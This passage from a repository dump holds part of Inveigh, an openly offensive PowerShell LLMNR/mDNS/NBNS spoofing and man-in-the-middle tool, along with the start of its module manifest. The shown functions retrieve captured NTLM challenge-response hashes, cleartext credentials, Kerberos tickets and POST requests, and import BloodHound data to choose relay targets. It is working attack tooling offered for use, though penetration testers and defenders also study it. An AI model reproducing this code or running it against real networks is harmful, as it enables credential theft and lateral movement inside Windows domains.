$unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(\":\",($unique_NTLMv2.IndexOf(\":\") + 2)))\n\n                        if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)\n                        {\n                            Write-Output($unique_NTLMv2 + $inveigh.newline)\n                        }\n\n                        $unique_NTLMv2_account_last = $unique_NTLMv2_account\n                    }\n\n                    $unique_NTLMv2_account_last = ''\n                    Start-Sleep -m 5\n                    Write-Output(\"[*] [$(Get-Date -format s)] Current NTLMv2 IP addresses and usernames:\" + $inveigh.newline)\n                    $NTLMv2_username_list_temp = $inveigh.NTLMv2_username_list\n\n                    foreach($NTLMv2_username in $NTLMv2_username_list_temp)\n                    {\n                        Write-Output($NTLMv2_username + $inveigh.newline)\n                    }\n                \n                }\n                else\n                {\n                    Write-Output(\"[+] [$(Get-Date -format s)] No NTLMv2 challenge/response hashes have been captured\" + $inveigh.newline)\n                }\n\n                $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()\n            }\n\n            if($inveigh.console_input)\n            {\n\n                if([Console]::KeyAvailable)\n                {\n                    $inveigh.console_output = $false\n                    BREAK console_loop\n                }\n        \n            }\n\n            Start-Sleep -m 5\n        }\n\n    }\n\n}\nfinally\n{\n\n    if($Tool -eq 2)\n    {\n        $inveigh.running = $false\n    }\n\n}\n\n}\n#endregion\n#region begin support functions\nfunction Stop-Inveigh\n{\n<#\n.SYNOPSIS\nStop-Inveigh will stop all running Inveigh functions.\n#>\n\n    if($inveigh)\n    {\n        $inveigh.stop = $true\n        \n        if($inveigh.running -or $inveigh.relay_running)\n        {\n            $inveigh.console_queue.Clear()\n            Watch-Inveigh -NoConsoleMessage\n        }\n        else\n        {\n            Write-Output \"[-] There are no running Inveigh functions\"\n        }\n\n    }\n\n}\n\nfunction Get-Inveigh\n{\n<#\n.SYNOPSIS\nGet-Inveigh will get stored Inveigh data from memory.\n\n.PARAMETER Console\nGet queued console output. This is also the default if no parameters are set.\n\n.PARAMETER ADIDNS\nGet added DNS host records.\n\n.PARAMETER ADIDNSFailed\nGet failed DNS host record adds.\n\n.PARAMETER Cleartext\nGet captured cleartext credentials.\n\n.PARAMETER CleartextUnique\nGet unique captured cleartext credentials.\n\n.PARAMETER KerberosUsername\nGet IP addresses, usernames, and index for captured Kerberos TGTs.\n\n.PARAMETER KerberosTGT\nGet Kerberos TGT kirbi byte array by index.\n\n.PARAMETER Learning\nGet valid hosts discovered through spoofer learning.\n\n.PARAMETER Log\nGet log entries.\n\n.PARAMETER NTLMv1\nGet captured NTLMv1 challenge/response hashes.\n\n.PARAMETER NTLMv1Unique\nGet the first captured NTLMv1 challenge/response for each unique account.\n\n.PARAMETER NTLMv1Usernames\nGet IP addresses and usernames for captured NTLMv1 challenge/response hashes.\n\n.PARAMETER NTLMv2\nGet captured NTLMv1 challenge/response hashes.\n\n.PARAMETER NTLMv2Unique\nGet the first captured NTLMv2 challenge/response for each unique account.\n\n.PARAMETER NTLMv2Usernames\nGet IP addresses and usernames for captured NTLMv2 challenge/response hashes.\n\n.PARAMETER POSTRequest\nGet captured POST requests.\n\n.PARAMETER POSTRequestUnique\nGet unique captured POST request.\n\n.PARAMETER Session\nGet relay session list.\n#>\n\n    [CmdletBinding()]\n    param\n    ( \n        [parameter(Mandatory=$false)][Switch]$Cleartext,\n        [parameter(Mandatory=$false)][Switch]$CleartextUnique,\n        [parameter(Mandatory=$false)][Switch]$Console,\n        [parameter(Mandatory=$false)][Switch]$ADIDNS,\n        [parameter(Mandatory=$false)][Switch]$ADIDNSFailed,\n        [parameter(Mandatory=$false)][Int]$KerberosTGT,\n        [parameter(Mandatory=$false)][Switch]$KerberosUsername,\n        [parameter(Mandatory=$false)][Switch]$Learning,\n        [parameter(Mandatory=$false)][Switch]$Log,\n        [parameter(Mandatory=$false)][Switch]$NTLMv1,\n        [parameter(Mandatory=$false)][Switch]$NTLMv2,\n        [parameter(Mandatory=$false)][Switch]$NTLMv1Unique,\n        [parameter(Mandatory=$false)][Switch]$NTLMv2Unique,\n        [parameter(Mandatory=$false)][Switch]$NTLMv1Usernames,\n        [parameter(Mandatory=$false)][Switch]$NTLMv2Usernames,\n        [parameter(Mandatory=$false)][Switch]$POSTRequest,\n        [parameter(Mandatory=$false)][Switch]$POSTRequestUnique,\n        [parameter(Mandatory=$false)][Switch]$Session,\n        [parameter(Mandatory=$false)][Switch]$Enumerate,\n        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter\n    )\n\n    if($Console -or $PSBoundParameters.Count -eq 0)\n    {\n\n        while($inveigh.console_queue.Count -gt 0)\n        {\n\n            if($inveigh.output_stream_only)\n            {\n                Write-Output($inveigh.console_queue[0] + $inveigh.newline)\n                $inveigh.console_queue.RemoveAt(0)\n            }\n            else\n            {\n\n                switch -wildcard ($inveigh.console_queue[0])\n                {\n\n                    {$_ -like \"?`[`!`]*\" -or $_ -like \"?`[-`]*\"}\n                    {\n                        Write-Warning $inveigh.console_queue[0]\n                        $inveigh.console_queue.RemoveAt(0)\n                    }\n\n                    default\n                    {\n                        Write-Output $inveigh.console_queue[0]\n                        $inveigh.console_queue.RemoveAt(0)\n                    }\n\n                }\n\n            }\n            \n        }\n\n    }\n\n    if($ADIDNS)\n    {\n        $ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys\n\n        foreach($ADIDNS_host in $ADIDNS_table_keys_temp)\n        {\n            \n            if($inveigh.ADIDNS_table.$ADIDNS_host -ge 1)\n            {\n                Write-Output $ADIDNS_host\n            }\n\n        }\n\n    }\n\n    if($ADIDNSFailed)\n    {\n\n        $ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys\n\n        foreach($ADIDNS_host in $ADIDNS_table_keys_temp)\n        {\n            \n            if($inveigh.ADIDNS_table.$ADIDNS_host -eq 0)\n            {\n                Write-Output $ADIDNS_host\n            }\n\n        }\n\n    }\n\n    if($KerberosTGT)\n    {\n        Write-Output $inveigh.kerberos_TGT_list[$KerberosTGT]\n    }\n\n    if($KerberosUsername)\n    {\n        Write-Output $inveigh.kerberos_TGT_username_list\n    }\n\n    if($Log)\n    {\n        Write-Output $inveigh.log\n    }\n\n    if($NTLMv1)\n    {\n        Write-Output $inveigh.NTLMv1_list\n    }\n\n    if($NTLMv1Unique)\n    {\n        $inveigh.NTLMv1_list.Sort()\n        $NTLMv1_list_temp = $inveigh.NTLMv1_list\n\n        foreach($unique_NTLMv1 in $NTLMv1_list_temp)\n        {\n            $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(\":\",($unique_NTLMv1.IndexOf(\":\") + 2)))\n\n            if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)\n            {\n                Write-Output $unique_NTLMv1\n            }\n\n            $unique_NTLMv1_account_last = $unique_NTLMv1_account\n        }\n\n    }\n\n    if($NTLMv1Usernames)\n    {\n        Write-Output $inveigh.NTLMv2_username_list\n    }\n\n    if($NTLMv2)\n    {\n        Write-Output $inveigh.NTLMv2_list\n    }\n\n    if($NTLMv2Unique)\n    {\n        $inveigh.NTLMv2_list.Sort()\n        $NTLMv2_list_temp = $inveigh.NTLMv2_list\n\n        foreach($unique_NTLMv2 in $NTLMv2_list_temp)\n        {\n            $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(\":\",($unique_NTLMv2.IndexOf(\":\") + 2)))\n\n            if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)\n            {\n                Write-Output $unique_NTLMv2\n            }\n\n            $unique_NTLMv2_account_last = $unique_NTLMv2_account\n        }\n\n    }\n\n    if($NTLMv2Usernames)\n    {\n        Write-Output $inveigh.NTLMv2_username_list\n    }\n\n    if($Cleartext)\n    {\n        Write-Output $inveigh.cleartext_list\n    }\n\n    if($CleartextUnique)\n    {\n        Write-Output $inveigh.cleartext_list | Get-Unique\n    }\n\n    if($POSTRequest)\n    {\n        Write-Output $inveigh.POST_request_list\n    }\n\n    if($POSTRequestUnique)\n    {\n        Write-Output $inveigh.POST_request_list | Get-Unique\n    }\n\n    if($Learning)\n    {\n        Write-Output $inveigh.valid_host_list\n    }\n\n    if($Session)\n    {\n        $i = 0\n\n        while($i -lt $inveigh.session_socket_table.Count)\n        {\n\n            if(!$inveigh.session_socket_table[$i].Connected)\n            {\n                $inveigh.session[$i] | Where-Object {$_.Status = \"disconnected\"}\n            }\n        \n            $i++\n        }\n\n        Write-Output $inveigh.session | Format-Table -AutoSize\n    }\n\n    if($Enumerate)\n    {\n        Write-Output $inveigh.enumerate\n    }\n\n}\n\nfunction Watch-Inveigh\n{\n<#\n.SYNOPSIS\nWatch-Inveigh will enabled real time console output. If using this function through a shell, test to ensure that it doesn't hang the shell.\n\n.PARAMETER ConsoleOutput\n(Medium,Low) Medium and Low can be used to reduce output.\n#>\n\n[CmdletBinding()]\nparam\n( \n    [parameter(Mandatory=$false)][Switch]$NoConsoleMessage,\n    [parameter(Mandatory=$false)][ValidateSet(\"Low\",\"Medium\",\"Y\")][String]$ConsoleOutput = \"Y\",\n    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter\n)\n\nif($inveigh.tool -ne 1)\n{\n\n    if($inveigh.running -or $inveigh.relay_running)\n    {\n        \n        if(!$NoConsoleMessage)\n        {\n            Write-Output \"[*] Press any key to stop console output\"\n        }\n\n        $inveigh.console_output = $true\n\n        :console_loop while((($inveigh.running -or $inveigh.relay_running) -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))\n        {\n\n            while($inveigh.console_queue.Count -gt 0)\n            {\n\n                switch -wildcard ($inveigh.console_queue[0])\n                {\n\n                    {$_ -like \"?`[`!`]*\" -or $_ -like \"?`[-`]*\"}\n                    {\n                        Write-Warning $inveigh.console_queue[0]\n                        $inveigh.console_queue.RemoveAt(0)\n                    }\n\n                    {$_ -like \"*spoofer disabled]\" -or $_ -like \"*local request]\" -or $_ -like \"* host header *\" -or $_ -like \"* user agent received *\"}\n                    {\n\n                        if($ConsoleOutput -eq 'Y')\n                        {\n                            Write-Output $inveigh.console_queue[0]\n                        }\n\n                        $inveigh.console_queue.RemoveAt(0)\n\n                    } \n\n                    {$_ -like \"*response sent]\" -or $_ -like \"*ignoring*\" -or $_ -like \"* HTTP*request for *\" -or $_ -like \"* Proxy*request for *\" -or $_ -like \"*SYN packet*\"}\n                    {\n                    \n                        if($ConsoleOutput -ne \"Low\")\n                        {\n                            Write-Output $inveigh.console_queue[0]\n                        }\n\n                        $inveigh.console_queue.RemoveAt(0)\n\n                    } \n\n                    default\n                    {\n                        Write-Output $inveigh.console_queue[0]\n                        $inveigh.console_queue.RemoveAt(0)\n                    }\n\n                } \n\n            }\n\n            if([Console]::KeyAvailable)\n            {\n                $inveigh.console_output = $false\n                BREAK console_loop\n            }\n\n            Start-Sleep -m 5\n        }\n\n    }\n    else\n    {\n        Write-Output \"[-] Inveigh isn't running\"\n    }\n\n}\nelse\n{\n    Write-Output \"[-] Watch-Inveigh cannot be used with current external tool selection\"\n}\n\n}\n\nfunction Clear-Inveigh\n{\n<#\n.SYNOPSIS\nClear-Inveigh will clear Inveigh data from memory.\n#>\n\nif($inveigh)\n{\n\n    if(!$inveigh.running -and !$inveigh.relay_running)\n    {\n        Remove-Variable inveigh -scope global\n        Write-Output \"[+] Inveigh data has been cleared from memory\"\n    }\n    else\n    {\n        Write-Output \"[-] Run Stop-Inveigh before running Clear-Inveigh\"\n    }\n\n}\n\n}\n\nfunction ConvertTo-Inveigh\n{\n    <#\n    .SYNOPSIS\n    ConvertTo-Inveigh imports Bloodhound computers, groups and session JSON files into $inveigh.enumerate\n    for Inveigh Relay targeting.\n\n    .DESCRIPTION\n    For the fastest import, import the data before gather any enumeration data with Inveigh.\n\n    .PARAMETER BloodHoundComputersJSON\n    BloodHound computers file.\n\n    .PARAMETER BloodHoundSessionsJSON\n    BloodHound sessions file.\n\n    .PARAMETER BloodHoundGroupsJSON\n    BloodHound groups file.\n\n    .PARAMTER DNS\n    Enable DNS lookups\n    #>\n\n    [CmdletBinding()]\n    param\n    ( \n        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Computers,\n        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Sessions,\n        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Groups,\n        [parameter(Mandatory=$false)][Switch]$DNS,\n        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter\n    )\n\n    if(!$Computers -and !$Sessions -and !$Groups)\n    {\n        Write-Output \"Specifiy a BloodHound computers, groups, or sessions JSON file\"\n        throw\n    }\n\n    if($inveigh.running -or $inveigh.relay_running)\n    {\n        Write-Output \"Run Stop-Inveigh before importing data with ConvertTo-Inveigh\"\n        throw\n    }\n\n    if(!$inveigh)\n    {\n        $global:inveigh = [HashTable]::Synchronized(@{})\n        $inveigh.cleartext_list = New-Object System.Collections.ArrayList\n        $inveigh.enumerate = New-Object System.Collections.ArrayList\n        $inveigh.IP_capture_list = New-Object System.Collections.ArrayList\n        $inveigh.log = New-Object System.Collections.ArrayList\n        $inveigh.kerberos_TGT_list = New-Object System.Collections.ArrayList\n        $inveigh.kerberos_TGT_username_list = New-Object System.Collections.ArrayList\n        $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList\n        $inveigh.NTLMv1_username_list = New-Object System.Collections.ArrayList\n        $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList\n        $inveigh.NTLMv2_username_list = New-Object System.Collections.ArrayList\n        $inveigh.POST_request_list = New-Object System.Collections.ArrayList\n        $inveigh.valid_host_list = New-Object System.Collections.ArrayList\n        $inveigh.ADIDNS_table = [HashTable]::Synchronized(@{})\n        $inveigh.relay_privilege_table = [HashTable]::Synchronized(@{})\n        $inveigh.relay_failed_login_table = [HashTable]::Synchronized(@{})\n        $inveigh.relay_history_table = [HashTable]::Synchronized(@{})\n        $inveigh.request_table = [HashTable]::Synchronized(@{})\n        $inveigh.session_socket_table = [HashTable]::Synchronized(@{})\n        $inveigh.session_table = [HashTable]::Synchronized(@{})\n        $inveigh.session_message_ID_table = [HashTable]::Synchronized(@{})\n        $inveigh.session_lock_table = [HashTable]::Synchronized(@{})\n        $inveigh.SMB_session_table = [HashTable]::Synchronized(@{})\n        $inveigh.domain_mapping_table = [HashTable]::Synchronized(@{})\n        $inveigh.group_table = [HashTable]::Synchronized(@{})\n        $inveigh.session_count = 0\n        $inveigh.session = @()\n    }\n\n    function New-RelayEnumObject\n    {\n        param ($IP,$Hostname,$DNSDomain,$netBIOSDomain,$Sessions,$AdministratorUsers,$AdministratorGroups,\n            $Privileged,$Shares,$NetSessions,$NetSessionsMapped,$LocalUsers,$SMB2,$Signing,$SMBServer,$DNSRecord,\n            $IPv6Only,$Targeted,$Enumerate,$Execute)\n\n        if($Sessions -and $Sessions -isnot [Array]){$Sessions = @($Sessions)}\n        if($AdministratorUsers -and $AdministratorUsers -isnot [Array]){$AdministratorUsers = @($AdministratorUsers)}\n        if($AdministratorGroups -and $AdministratorGroups -isnot [Array]){$AdministratorGroups = @($AdministratorGroups)}\n        if($Privileged -and $Privileged -isnot [Array]){$Privileged = @($Privileged)}\n        if($Shares -and $Shares -isnot [Array]){$Shares = @($Shares)}\n        if($NetSessions -and $NetSessions -isnot [Array]){$NetSessions = @($NetSessions)}\n        if($NetSessionsMapped -and $NetSessionsMapped -isnot [Array]){$NetSessionsMapped = @($NetSessionsMapped)}\n        if($LocalUsers -and $LocalUsers -isnot [Array]){$LocalUsers = @($LocalUsers)}\n\n        $relay_object = New-Object PSObject\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Index\" $inveigh.enumerate.Count\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"IP\" $IP\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Hostname\" $Hostname\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"DNS Domain\" $DNSDomain\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"netBIOS Domain\" $netBIOSDomain\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Sessions\" $Sessions\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Administrator Users\" $AdministratorUsers\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Administrator Groups\" $AdministratorGroups\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Privileged\" $Privileged\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Shares\" $Shares\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"NetSessions\" $NetSessions\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"NetSessions Mapped\" $NetSessionsMapped\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Local Users\" $LocalUsers\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"SMB2.1\" $SMB2\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Signing\" $Signing\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"SMB Server\" $SMBServer\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"DNS Record\" $DNSRecord\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"IPv6 Only\" $IPv6Only\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Targeted\" $Targeted\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Enumerate\" $Enumerate\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Execute\" $Execute\n        \n        return $relay_object\n    }\n\n    function Get-DNSEntry([String]$hostname)\n    {\n\n        try\n        {\n            $IP_list = [System.Net.Dns]::GetHostEntry($hostname)\n\n            foreach($entry in $IP_list.AddressList)\n            {\n\n                if(!$entry.IsIPv6LinkLocal)\n                {\n                    $IP = $entry.IPAddressToString\n                }\n\n            }\n                    \n        }\n        catch\n        {\n            $IP = $null\n        }\n\n        return $IP\n    }\n\n    # JSON parsing from http://wahlnetwork.com/2016/03/15/deserializing-large-json-payloads-powershell-objects/ \n    function Invoke-ParseItem($JSONItem) \n    {\n\n        if($JSONItem.PSObject.TypeNames -match 'Array') \n        {\n            return Invoke-ParseJsonArray($JSONItem)\n        }\n        elseif($JSONItem.PSObject.TypeNames -match 'Dictionary') \n        {\n            return Invoke-ParseJsonObject([HashTable]$JSONItem)\n        }\n        else \n        {\n            return $JSONItem\n        }\n\n    }\n\n    function Invoke-ParseJsonObject($JSONObject) \n    {\n        $result = New-Object -TypeName PSCustomObject\n\n        foreach($key in $JSONObject.Keys) \n        {\n            $item = $JSONObject[$key]\n\n            if ($item) \n            {\n                $parsed_item = Invoke-ParseItem $item\n            }\n            else \n            {\n                $parsed_item = $null\n            }\n\n            $result | Add-Member -MemberType NoteProperty -Name $key -Value $parsed_item\n        }\n\n        return $result\n    }\n\n    function Invoke-ParseJSONArray($JSONArray) \n    {\n        $result = @()\n        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()\n        $i = 0\n\n        $JSONArray | ForEach-Object -Process {\n\n            if($stopwatch_progress.Elapsed.TotalMilliseconds -ge 500)\n            {\n                $percent_complete_calculation = [Math]::Truncate($i / $JSONArray.count * 100)\n\n                if($percent_complete_calculation -le 100)\n                {\n                    Write-Progress -Activity \"Parsing JSON\" -Status \"$percent_complete_calculation% Complete:\" -PercentComplete $percent_complete_calculation -ErrorAction SilentlyContinue\n                }\n\n                $stopwatch_progress.Reset()\n                $stopwatch_progress.Start()\n            }\n\n            $i++\n            $result += , (Invoke-ParseItem $_)}\n\n        return $result\n    }\n\n    function Invoke-ParseJSONString($json) \n    {\n        $config = $javaScriptSerializer.DeserializeObject($json)\n\n        return Invoke-ParseJsonObject $config\n    }\n\n    [void][System.Reflection.Assembly]::LoadWithPartialName(\"System.Web.Extensions\")\n\n    if($inveigh.enumerate.Count -eq 0)\n    {\n        $enumerate_empty = $true\n    }\n\n    if($Computers)\n    {       \n        $Computers = (Resolve-Path $Computers).Path\n        $computers_serializer = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer\n        $computers_serializer.MaxJsonLength = 104857600\n        $bloodhound_computers = [System.IO.File]::ReadAllText($Computers)\n        $bloodhound_computers = $computers_serializer.DeserializeObject($bloodhound_computers)\n        Write-Output \"[*] Parsing BloodHound Computers JSON\"\n        $stopwatch_parse = [System.Diagnostics.Stopwatch]::StartNew()\n        $bloodhound_computers = Invoke-ParseItem $bloodhound_computers\n        Write-Output \"[+] Parsing completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds\"\n        $stopwatch_parse.Reset()\n        $stopwatch_parse.Start()\n        Write-Output \"[*] Importing computers to Inveigh\"\n        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()\n        $i = 0\n\n        if(!$bloodhound_computers.Computers)\n        {\n            Write-Output \"[!] JSON computers parse failed\"\n            throw\n        }\n\n        $bloodhound_computers.Computers | ForEach-Object {\n\n            if($stopwatch_progress.Elapsed.TotalMilliseconds -ge 500)\n            {\n                $percent_complete_calculation = [Math]::Truncate($i / $bloodhound_computers.Computers.Count * 100)\n\n                if($percent_complete_calculation -le 100)\n                {\n                    Write-Progress -Activity \"[*] Importing computers\" -Status \"$percent_complete_calculation% Complete:\" -PercentComplete $percent_complete_calculation -ErrorAction SilentlyContinue\n                }\n\n                $stopwatch_progress.Reset()\n                $stopwatch_progress.Start()\n            }\n\n            $hostname = $_.Name\n            [Array]$local_admin_users = $_.LocalAdmins | Where-Object {$_.Type -eq 'User'} | Select-Object -expand Name\n            [Array]$local_admin_groups = $_.LocalAdmins | Where-Object {$_.Type -eq 'Group'} | Select-Object -expand Name\n\n            if($DNS)\n            {\n                $IP = Get-DNSEntry $hostname\n\n                if(!$IP)\n                {\n                    Write-Output \"[-] DNS lookup for $Hostname failed\"\n                }\n\n            }\n\n            if(!$enumerate_empty)\n            {\n\n                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n                {\n\n                    if(($hostname -and $inveigh.enumerate[$i].Hostname -eq $hostname) -or ($IP -and $inveigh.enumerate[$i].IP -eq $IP))\n                    {\n\n                        if($inveigh.enumerate[$i].Hostname -ne $hostname -and $inveigh.enumerate[$i].IP -eq $IP)\n                        {\n\n                            for($j = 0;$j -lt $inveigh.enumerate.Count;$j++)\n                            {\n\n                                if($inveigh.enumerate[$j].IP -eq $target)\n                                {\n                                    $target_index = $j\n                                    break\n                                }\n\n                            }\n\n                            $inveigh.enumerate[$target_index].Hostname = $hostname\n                        }\n                        else\n                        {\n\n                            for($j = 0;$j -lt $inveigh.enumerate.Count;$j++)\n                            {\n\n                                if($inveigh.enumerate[$j].Hostname -eq $hostname)\n                                {\n                                    $target_index = $j\n                                    break\n                                }\n\n                            }\n\n                        }\n\n                        $inveigh.enumerate[$target_index].\"Administrator Users\" = $local_admin_users\n                        $inveigh.enumerate[$target_index].\"Administrator Groups\" = $local_admin_groups\n                    }\n                    else\n                    {\n                        $inveigh.enumerate.Add((New-RelayEnumObject -Hostname $_.Name -IP $IP -AdministratorUsers $local_admin_users -AdministratorGroups $local_admin_groups)) > $null\n                    }\n\n                }\n\n            }\n            else\n            {\n                $inveigh.enumerate.Add((New-RelayEnumObject -Hostname $_.Name -IP $IP -AdministratorUsers $local_admin_users -AdministratorGroups $local_admin_groups)) > $null\n            }\n\n            $IP = $null\n            $hostname = $null\n            $local_admin_users = $null\n            $local_admin_groups = $null\n            $target_index = $null\n            $i++\n        }\n\n        Write-Output \"[+] Import completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds\"\n        $stopwatch_parse.Reset()\n        Remove-Variable bloodhound_computers\n    }\n\n    if($Sessions)\n    {\n        $Sessions = (Resolve-Path $Sessions).Path\n        $sessions_serializer = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer\n        $sessions_serializer.MaxJsonLength = 104857600\n        $bloodhound_sessions = [System.IO.File]::ReadAllText($Sessions)\n        $bloodhound_sessions = $sessions_serializer.DeserializeObject($bloodhound_sessions)\n        $stopwatch_parse = [System.Diagnostics.Stopwatch]::StartNew()\n        Write-Output \"[*] Parsing BloodHound Sessions JSON\"\n        $bloodhound_sessions = Invoke-ParseItem $bloodhound_sessions\n        Write-Output \"[+] Parsing completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds\"\n        $stopwatch_parse.Reset()\n        $stopwatch_parse.Start()\n        Write-Output \"[*] Importing sessions to Inveigh\"\n        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()\n        $i = 0\n\n        if(!$bloodhound_sessions.Sessions)\n        {\n            Write-Output \"[!] JSON sessions parse failed\"\n            throw\n        }\n\n        $bloodhound_sessions.Sessions | ForEach-Object {\n            \n            if($stopwatch_progress.Elapsed.TotalMilliseconds -ge 500)\n            {\n                $percent_complete_calculation = [Math]::Truncate($i / $bloodhound_sessions.Sessions.Count * 100)\n\n                if($percent_complete_calculation -le 100)\n                {\n                    Write-Progress -Activity \"[*] Importing sessions\" -Status \"$percent_complete_calculation% Complete:\" -PercentComplete $percent_complete_calculation -ErrorAction SilentlyContinue\n                }\n\n                $stopwatch_progress.Reset()\n                $stopwatch_progress.Start()\n            }\n\n            $hostname = $_.ComputerName\n\n            if($hostname -as [IPAddress] -as [Bool])\n            {\n                $IP = $hostname\n                $hostname = $null\n\n                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n                {\n\n                    if($inveigh.enumerate[$i].IP -eq $target)\n                    {\n                        $target_index = $i\n                        break\n                    }\n\n                }\n\n            }\n            else\n            {\n                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n                {\n\n                    if($inveigh.enumerate[$i].Hostname -eq $hostname)\n                    {\n                        $target_index = $i\n                        break\n                    }\n\n                }\n\n                if($DNS)\n                {\n                    $IP = Get-DNSEntry $hostname\n\n                    if(!$IP)\n                    {\n                        Write-Output \"[-] DNS lookup for $Hostname failed or IPv6 address\"\n                    }\n\n                }\n\n            }\n\n            if(!$enumerate_empty -or $target_index -ge 0)\n            {\n                [Array]$session_list = $inveigh.enumerate[$target_index].Sessions\n\n                if($session_list -notcontains $_.UserName)\n                {\n                    $session_list += $_.UserName\n                    $inveigh.enumerate[$target_index].Sessions = $session_list\n                }\n\n            }\n            else\n            {   \n                $inveigh.enumerate.Add($(New-RelayEnumObject -Hostname $hostname -IP $IP -Sessions $_.UserName)) > $null\n            }\n\n            $hostname = $null\n            $IP = $null\n            $session_list = $null\n            $target_index = $null\n            $i++\n        }\n\n        Write-Output \"[+] Import completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds\"\n        $stopwatch_parse.Reset()\n        Remove-Variable bloodhound_sessions\n    }\n    \n    if($Groups)\n    {\n        $Groups = (Resolve-Path $Groups).Path\n        $groups_serializer = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer\n        $groups_serializer.MaxJsonLength = 104857600\n        $bloodhound_groups = [System.IO.File]::ReadAllText($Groups)\n        $bloodhound_groups = $groups_serializer.DeserializeObject($bloodhound_groups)\n        $stopwatch_parse = [System.Diagnostics.Stopwatch]::StartNew()\n        Write-Output \"[*] Parsing BloodHound Groups JSON\"\n        $bloodhound_groups = Invoke-ParseItem $bloodhound_groups\n        Write-Output \"[+] Parsing completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds\"\n        $stopwatch_parse.Reset()\n        $stopwatch_parse.Start()\n        Write-Output \"[*] Importing groups to Inveigh\"\n        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()\n        $i = 0\n\n        if(!$bloodhound_groups.Groups)\n        {\n            Write-Output \"[!] JSON groups parse failed\"\n            throw\n        }\n        \n        $bloodhound_groups.Groups | ForEach-Object {\n\n            if($stopwatch_progress.Elapsed.TotalMilliseconds -ge 500)\n            {\n                $percent_complete_calculation = [Math]::Truncate($i / $bloodhound_groups.Groups.Count * 100)\n\n                if($percent_complete_calculation -le 100)\n                {\n                    Write-Progress -Activity \"[*] Importing groups\" -Status \"$percent_complete_calculation% Complete:\" -PercentComplete $percent_complete_calculation -ErrorAction SilentlyContinue\n                }\n\n                $stopwatch_progress.Reset()\n                $stopwatch_progress.Start()\n            }\n\n            [Array]$group_members = $_.Members | Select-Object -expand MemberName\n            $inveigh.group_table.Add($_.Name,$group_members)\n            $group_members = $null\n            $i++\n        }\n\n        Write-Output \"[+] Import completed in $([Math]::Truncate($stopwatch.Elapsed.TotalSeconds)) seconds\"\n    }\n\n}\n\n#endregion"
        },
        {
          "name": "Inveigh.psd1",
          "type": "blob",
          "size": 2.2509765625,
          "content": "#\n# Module manifest for module 'Inveigh'\n#\n# Generated by: Kevin Robertson\n#\n# Generated on: 10/10/2015\n#\n\n@{\n\n# Script module or binary module file associated with this manifest\nModuleToProcess = 'Inveigh.psm1'\n\n# Version number of this module.\nModuleVersion = '1.4'\n\n# ID used to uniquely identify this module\nGUID = '4f991a73-c574-44b7-85df-da769f39d45d'\n\n# Author of this module\nAuthor = 'Kevin Robertson'\n\n# Company or vendor of this module\nCompanyName = ''\n\n# Copyright statement for this module\nCopyright = 'BSD 3-Clause'\n\n# Description of the functionality provided by this module\nDescription = 'Inveigh - LLMNR/mDNS/NBNS spoofer/man-in-the-middle tool'\n\n# Minimum version of the Windows PowerShell engine required by this module\nPowerShellVersion = '2.0'\n\n# Name of the Windows PowerShell host required by this module\nPowerShellHostName = ''\n\n# Minimum version of the Windows PowerShell host required by this module\nPowerShellHostVersion = ''\n\n# Minimum version of the .NET Framework required by this module\nDotNetFrameworkVersion = ''\n\n# Minimum version of the common language runtime (CLR) required by this module\nCLRVersion = ''\n\n# Processor architecture (None, 